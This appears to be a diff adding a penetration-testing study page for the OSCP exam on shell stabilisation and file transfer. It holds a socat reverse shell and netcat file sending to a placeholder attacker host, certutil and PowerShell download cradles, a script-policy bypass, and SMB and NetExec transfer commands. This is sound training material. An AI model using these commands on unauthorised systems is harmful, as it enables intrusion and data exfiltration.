@@ -1,0 +1,290 @@
+
+> <b>Purpose:</b> get a usable interactive shell, then move files in both directions without guessing which cradle the target supports. One page: serve → download → upload → verify.
+
+## Pick the channel first
+
+| Need | Tool | Runs on |
+| --- | --- | --- |
+| Stable TTY from a dumb shell | <code>python3 pty.spawn</code>, <code>socat</code> | target |
+| Serve a file over HTTP | <code>python3 -m http.server</code> | Kali |
+| Serve a file over SMB | <code>impacket-smbserver</code> | Kali |
+| Download on Linux | <code>wget</code>, <code>curl</code> | target |
+| Download on Windows | <code>certutil</code>, <code>IWR</code>, <code>copy </code> | target |
+| Upload to Linux | <code>scp</code> | target |
+| Upload to Windows | <code>nxc --put-file</code>, SMB share write | Kali / target |
+| Pull a file back | <code>nxc --get-file</code>, SMB share, base64 | Kali |
+
+<b>Rule:</b> prefer HTTP for downloads, SMB for bulk or when HTTP is filtered, and base64 only for small text (keys, scripts). Never assume <code>certutil</code> exists just because the host is Windows.
+
+## A. Stabilise the shell
+
+### Step 01 — Get a real TTY
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# or, if python is absent
+script -qc /bin/bash /dev/null
+```
+
+<b>Look for:</b> a prompt where arrow keys and <code>Ctrl-C</code> behave normally.<br /><b>Decision:</b> python3 exists → this is the fastest route. No python → <code>script</code>, then <code>socat</code> (Step 03).<br /><b>Next:</b> Step 02.<br /><b>Common mistake:</b> stopping at <code>pty.spawn</code> and not fixing the terminal — you get a TTY that still has no job control or echo.<br /><b>Evidence:</b> the command used and the resulting prompt.
+
+### Step 02 — Fix terminal settings
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali then target · <b>Status:</b> Syntax Checked
+
+```bash
+# in the target shell
+export TERM=xterm
+stty rows 40 cols 160
+# in Kali: background the shell, then
+stty raw -echo; fg
+```
+
+<b>Look for:</b> <code>sudo</code>, <code>vim</code>, <code>nano</code> and <code>su</code> accepting input correctly; <code>Ctrl-C</code> not killing the shell.<br /><b>Decision:</b> still broken → Step 03 (socat gives a fully functional PTY).<br /><b>Next:</b> proceed with enumeration, or Step 03 if tools need a TTY.<br /><b>Common mistake:</b> running <code>stty raw -echo</code> on the <b>target</b>. It belongs on <b>Kali</b> after you background the shell, then <code>fg</code>.<br /><b>Evidence:</b> the <code>stty -a</code> output on the target.
+
+### Step 03 — socat full TTY (when python is missing)
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali + target · <b>Status:</b> Documented
+
+```bash
+# Kali listener
+socat file:`tty`,raw,echo=0 tcp-listen:<LOCAL_PORT>,reuseaddr
+# target
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER_IP>:<LOCAL_PORT>
+```
+
+<b>Look for:</b> a prompt with working job control and history.<br /><b>Decision:</b> <code>socat</code> is not on the target → upload a static binary (Step 04/05) or stay with <code>script</code>.<br /><b>Next:</b> enumerate.<br /><b>Common mistake:</b> forgetting <code>sane</code> on the target side — the terminal stays in raw mode after exit.<br /><b>Evidence:</b> the working prompt.
+
+## B. Serve files from Kali
+
+### Step 04 — HTTP server
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+python3 -m http.server <LOCAL_PORT>
+python3 -m http.server <LOCAL_PORT> --directory <OUTPUT_DIR>
+```
+
+<b>Look for:</b> <code>Serving HTTP on 0.0.0.0 port …</code> and a <code>GET</code> line per download.<br /><b>Decision:</b> the target can reach you → this is the default channel. Target cannot reach Kali → see the pivoting note.<br /><b>Next:</b> Step 07 (Linux) or Step 10/11 (Windows).<br /><b>Common mistake:</b> starting the server in the wrong directory. Use <code>--directory</code> or <code>cd</code> first — the target sees only the current folder.<br /><b>Evidence:</b> the access log line for the transferred file.
+
+### Step 05 — SMB server
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+impacket-smbserver share $(pwd) -smb2support -username <USERNAME> -password <PASSWORD>
+# Windows target
+copy \\<ATTACKER_IP>\share\<FILE> C:\Windows\Temp\<FILE>
+```
+
+<b>Look for:</b> <code>Config file</code> / <code>Serving</code> lines and the file appearing on the target.<br /><b>Decision:</b> HTTP is blocked but 445 outbound works → SMB. Modern Windows refuses guest SMB → always set <code>-username</code>/<code>-password</code>.<br /><b>Next:</b> execute or verify (Step 15).<br /><b>Common mistake:</b> running smbserver without credentials on a hardened host — Windows blocks insecure guest auth by default.<br /><b>Evidence:</b> the SMB log and the transferred file.
+
+### Step 06 — Netcat: banner grab and ad-hoc transfer
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+# banner grab
+nc -nv <TARGET_IP> <TARGET_PORT>
+# receive a file (Kali)
+nc -lvnp <LOCAL_PORT> > <OUTPUT_FILE>
+# send a file (target)
+nc <ATTACKER_IP> <LOCAL_PORT> < <FILE>
+```
+
+<b>Look for:</b> the service banner, or a completed file with matching size.<br /><b>Decision:</b> no banner → the port may be filtered or TLS-wrapped; use <code>openssl s_client</code>.<br /><b>Next:</b> verify integrity (Step 15).<br /><b>Common mistake:</b> omitting <code>-l</code> and accidentally connecting out instead of listening, or omitting <code>-n</code> so netcat stalls on DNS. <code>nc -lvnp <LOCAL_PORT></code> works on this build (verified); <code>nc -l -p <LOCAL_PORT></code> is the equivalent long form.<br /><b>Evidence:</b> the banner text or the received file hash.
+
+## C. Linux target
+
+### Step 07 — wget
+
+<b>Priority:</b> Core · <b>Run on:</b> Linux target · <b>Status:</b> Syntax Checked
+
+```bash
+wget http://<ATTACKER_IP>:<LOCAL_PORT>/<FILE> -O /tmp/<FILE>
+# optional: headers only, or mirror a site
+wget --server-response http://<ATTACKER_IP>:<LOCAL_PORT>/<FILE>
+wget --mirror http://<TARGET_IP>/
+```
+
+<b>Look for:</b> <code>'<FILE>' saved</code> and the expected byte count.<br /><b>Decision:</b> wget missing → Step 08 (curl) or <code>python3 -c</code> with urllib.<br /><b>Next:</b> <code>chmod +x</code> and run, or Step 15.<br /><b>Common mistake:</b> forgetting <code>-O /tmp/<FILE></code> — the file lands in the current directory with a name derived from the URL.<br /><b>Evidence:</b> the saved path and <code>ls -l</code>.
+
+### Step 08 — curl
+
+<b>Priority:</b> Core · <b>Run on:</b> Linux target · <b>Status:</b> Syntax Checked
+
+```bash
+curl -o /tmp/<FILE> http://<ATTACKER_IP>:<LOCAL_PORT>/<FILE>
+curl -s -O http://<ATTACKER_IP>:<LOCAL_PORT>/<FILE>
+```
+
+<b>Look for:</b> the file on disk, no HTML error page.<br /><b>Decision:</b> curl missing → <code>wget</code>, or <code>busybox wget</code> on embedded systems.<br /><b>Next:</b> execute or verify.<br /><b>Common mistake:</b> downloading an error page because the URL is wrong — always check the size and <code>file</code> type before running it.<br /><b>Evidence:</b> <code>ls -l</code> and <code>file /tmp/<FILE></code>.
+
+### Step 09 — scp (both directions)
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali or target · <b>Status:</b> Syntax Checked
+
+```bash
+# upload from Kali
+scp <FILE> <USERNAME>@<TARGET_IP>:/tmp/<FILE>
+# download to Kali
+scp <USERNAME>@<TARGET_IP>:/tmp/<FILE> <OUTPUT_DIR>/
+# non-standard port
+scp -P <TARGET_PORT> <FILE> <USERNAME>@<TARGET_IP>:/tmp/<FILE>
+```
+
+<b>Look for:</b> a progress bar and the file at the destination.<br /><b>Decision:</b> SSH is open and you have a password or key → fastest bidirectional channel.<br /><b>Next:</b> verify (Step 15).<br /><b>Common mistake:</b> using <code>-p</code> for the port. In scp the port flag is capital <code>-P</code>; lowercase preserves timestamps.<br /><b>Evidence:</b> the scp output and destination listing.
+
+## D. Windows target
+
+### Step 10 — certutil
+
+<b>Priority:</b> Core · <b>Run on:</b> Windows target · <b>Status:</b> Syntax Checked
+
+```shen
+certutil -urlcache -split -f http://<ATTACKER_IP>:<LOCAL_PORT>/<FILE> C:\Windows\Temp\<FILE>
+```
+
+<b>Look for:</b> <code>CertUtil: -URLCache command completed successfully</code> and the file in <code>Temp</code>.<br /><b>Decision:</b> certutil is blocked by AV/AppLocker → Step 11 or Step 12.<br /><b>Next:</b> run it, or Step 15.<br /><b>Common mistake:</b> omitting <code>-split -f</code> — without them certutil may cache instead of writing the file where you expect.<br /><b>Evidence:</b> the certutil output and <code>dir C:\Windows\Temp</code>.
+
+### Step 11 — PowerShell download
+
+<b>Priority:</b> Core · <b>Run on:</b> Windows target · <b>Status:</b> Syntax Checked
+
+```powershell
+IWR -Uri http://<ATTACKER_IP>:<LOCAL_PORT>/<FILE> -OutFile C:\Windows\Temp\<FILE>
+Invoke-WebRequest -Uri http://<ATTACKER_IP>:<LOCAL_PORT>/<FILE> -OutFile C:\Windows\Temp\<FILE>
+```
+
+<b>Look for:</b> no error and the file present.<br /><b>Decision:</b> <code>IWR</code> blocked by script policy → <code>powershell -ep bypass -c "IWR …"</code> or Step 12.<br /><b>Next:</b> execute, or Step 15.<br /><b>Common mistake:</b> using <code>-OutFile</code> with a relative path from a shell whose working directory you do not control. Always use the full <code>C:\…</code> path.<br /><b>Evidence:</b> <code>Get-Item</code> on the downloaded file.
+
+### Step 12 — Copy from an SMB share
+
+<b>Priority:</b> Conditional · <b>Run on:</b> Windows target · <b>Status:</b> Syntax Checked
+
+```shen
+copy \\<ATTACKER_IP>\share\<FILE> C:\Windows\Temp\<FILE>
+```
+
+```bash
+# or pull a specific file back to Kali
+nxc smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --get-file \Windows\Temp\<FILE> ./<FILE>
+```
+
+<b>Look for:</b> <code>1 file(s) copied</code> / the file appearing locally.<br /><b>Decision:</b> outbound 445 works → this is the most reliable Windows channel. No SMB → HTTP cradles.<br /><b>Next:</b> verify (Step 15).<br /><b>Common mistake:</b> forgetting the double backslash prefix for a UNC path (<code>\\<ATTACKER_IP>\share</code>), which turns it into a local path.<br /><b>Evidence:</b> the copy output and the file hash.
+
+### Step 13 — Push with NetExec
+
+<b>Priority:</b> Core · <b>Run on:</b> Kali · <b>Status:</b> Syntax Checked
+
+```bash
+nxc smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --put-file <FILE> \Windows\Temp\<FILE>
+```
+
+<b>Look for:</b> <code>File <FILE> was uploaded</code> or no error, and the file on the target.<br /><b>Decision:</b> you have SMB admin → push without touching the target's download tools. No admin → use an HTTP/WMI method.<br /><b>Next:</b> execute via <code>-x</code>, or verify.<br /><b>Common mistake:</b> passing a full <code>C:\…</code> path where nxc expects a share-relative path (<code>\Windows\Temp\<FILE></code>). Check the version's help.<br /><b>Evidence:</b> the nxc output and <code>dir</code> on the target.
+
+### Step 14 — Base64 (text and small binaries)
+
+<b>Priority:</b> Conditional · <b>Run on:</b> either side · <b>Status:</b> Syntax Checked
+
+```bash
+# encode (Linux)
+base64 -w0 <FILE> > <OUTPUT_FILE>
+# decode (Linux target)
+base64 -d <OUTPUT_FILE> > <FILE>
+```
+
+```powershell
+# decode (Windows PowerShell)
+[IO.File]::WriteAllBytes("C:\Windows\Temp\<FILE>",[Convert]::FromBase64String("<BASE64_BLOB>"))
+```
+
+<b>Look for:</b> the decoded file's hash matching the source.<br /><b>Decision:</b> no network egress and only a text channel (RDP clipboard, web shell) → base64. Large binaries → split into chunks and reassemble.<br /><b>Next:</b> verify (Step 15).<br /><b>Common mistake:</b> pasting a wrapped base64 blob. Use <code>-w0</code> to disable line wrapping, or the Windows decode fails silently.<br /><b>Evidence:</b> matching hashes on both ends.
+
+## E. Verify integrity
+
+### Step 15 — Confirm the transfer
+
+<b>Priority:</b> Core · <b>Run on:</b> both · <b>Status:</b> Syntax Checked
+
+```bash
+md5sum <FILE>
+sha256sum <FILE>
+```
+
+```cmd
+# Windows cmd
+certutil -hashfile C:\Windows\Temp\<FILE> SHA256
+```
+
+```powershell
+# Windows PowerShell — Get-FileHash is a cmdlet, not a cmd.exe built-in
+Get-FileHash C:\Windows\Temp\<FILE> -Algorithm SHA256
+```
+
+<b>Look for:</b> identical hashes on Kali and the target.<br /><b>Decision:</b> mismatch → the transfer truncated (text mode, base64 wrapping, or an error page). Re-send with a binary-safe method.<br /><b>Next:</b> execute the file, or attach the hash to your notes.<br /><b>Common mistake:</b> comparing hashes of a file that was modified by the target (line-ending conversion). Hash the exact artifact you will use.<br /><b>Evidence:</b> both hash outputs side by side.
+
+## F. Decision tree
+
+| Situation | Do this | Do <b>not</b> |
+| --- | --- | --- |
+| Dumb shell, python present | <code>pty.spawn</code>  • <code>stty</code> (Steps 01-02) | Work in a shell without job control |
+| Linux target, HTTP outbound | <code>wget</code>/<code>curl</code> (Steps 07-08) | Try certutil on Linux |
+| Windows target, HTTP outbound | certutil or IWR (Steps 10-11) | Assume PowerShell is unrestricted |
+| HTTP filtered, SMB open | smbserver + <code>copy</code> (Steps 05/12) | Use guest SMB on modern Windows |
+| Have SMB admin | <code>nxc --put-file</code> (Step 13) | Upload by hand |
+| Only a text channel | base64 (Step 14) | Paste a wrapped blob |
+| Need a file <b>back</b> | <code>nxc --get-file</code>, SMB, or base64 | Screenshot the content |
+| Transfer "worked" but file won't run | Wrong architecture / truncation | Re-run it blindly |
+
+## G. Troubleshooting
+
+| Symptom | Cause | Fix |
+| --- | --- | --- |
+| Downloaded file is HTML | Wrong URL / 404 page | Check the server log and <code>file</code> output |
+| <code>Permission denied</code> executing | No <code>+x</code> bit | <code>chmod +x <FILE></code> |
+| <code>Text file busy</code> | File running or mounted noexec | Copy to <code>/tmp</code> and <code>chmod</code> |
+| certutil writes nothing | Cached / wrong flags | <code>-urlcache -split -f</code> |
+| SMB <code>access denied</code> | Guest blocked | Add <code>-username</code>/<code>-password</code> |
+| scp <code>connection refused</code> | SSH not open | Use HTTP/SMB, or another port |
+| base64 decode fails | Line wrapping / bad padding | <code>-w0</code>, verify length multiple of 4 |
+| Transfer stalls on large file | Timeout / MTU | Split with <code>split</code>, or use SMB |
+
+<b>Pivoting variant.</b> If the target can only reach the <b>pivot</b>, do not serve from Kali. Either upload the tool to the pivot and serve it there, or reverse-forward Kali's server onto the pivot:
+
+```bash
+# on Kali — expose local 8000 on the pivot's 8000
+ssh -R 8000:127.0.0.1:8000 <USERNAME>@<PIVOT_IP>
+# on the target — download through the pivot
+wget http://<PIVOT_IP>:8000/<FILE> -O /tmp/<FILE>
+```
+
+<code>scp</code> through a proxy needs a ProxyCommand; simpler to use <code>nxc --put-file</code>/<code>--get-file</code> or SMB, which ride the existing tunnel without extra configuration.
+
+## H. Evidence to preserve
+
+- The cradle command and the server-side log line proving the transfer.
+- The file hash on both ends.
+- For shells: the stabilisation sequence that made the TTY usable.
+- Where the file was written on the target (full path).
+
+## I. Related pages
+
+- <mention url="https://app.notion.com/p/4011e51238b58123b446cc627bc02913" /> — keys, tunnels, and scp
+- <mention url="https://app.notion.com/p/4011e51238b581bbadcbe10d66d5ce31" /> — share access and smbserver context
+- Post-Exploitation & Lateral Movement — NetExec file push and execution
+- [Tunneling & Pivoting — Complete Command Reference](https://app.notion.com/p/4011e51238b581469eede872cfb47724)
+- OSCP Attack Workflow — Start Here
+
+## J. References
+
+- HackTricks file transfer: [https://book.hacktricks.wiki/en/generic-hacking/exfiltration-os-command.html](https://book.hacktricks.wiki/en/generic-hacking/exfiltration-os-command.html)
+- Impacket smbserver: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
+- NetExec wiki: [https://www.netexec.wiki/](https://www.netexec.wiki/)
+
+## K. Verification note
+
+<code>wget</code>, <code>curl</code>, <code>scp</code>, <code>python3 -m http.server</code>, <code>impacket-smbserver</code>, <code>nxc</code>, <code>nc</code>, <code>socat</code>, <code>base64</code> and <code>md5sum</code> are installed here and their flags were checked against local help, so those steps are <b>Syntax Checked</b>. Windows built-ins (<code>certutil</code>, <code>IWR</code>, <code>copy</code>) are documented syntax, also <b>Syntax Checked</b>; the <code>socat</code> TTY sequence was not executed against a live target and is <b>Documented</b>. Nothing was executed against a live target for this page, so no step is <b>Lab Tested</b>.
